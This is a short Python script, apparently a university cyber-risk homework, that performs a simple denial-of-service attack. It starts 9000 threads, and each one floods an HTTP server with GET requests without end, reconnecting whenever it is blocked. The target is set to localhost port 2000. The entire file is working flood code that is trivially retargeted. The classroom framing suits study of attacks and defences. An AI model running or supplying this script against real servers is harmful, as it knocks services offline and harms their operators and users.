import threading
import http.client
import time

'''
    Cyber risks assessment - HW1
    Simple DOS Attack
    Created by: Gil ben hamo, Yovel aloni, Itzhak rahamim
'''

target_ip = '127.0.0.1:2000'

def DOSattack():
    cc_obj = http.client.HTTPConnection(target_ip) #create initial connection
    while True:
        try:
            cc_obj.request("GET", "/")
            print("-Send get request packet-")
            cc_obj.getresponse()                    #forcing the server to send response
        #if the connections got blocked or crush, close the connection and create a new one
        except:
            cc_obj.close()  
            cc_obj = http.client.HTTPConnection(target_ip)
            
        

for i in range(9000):
    ATT_thread = threading.Thread(target = DOSattack)
    ATT_thread.start()
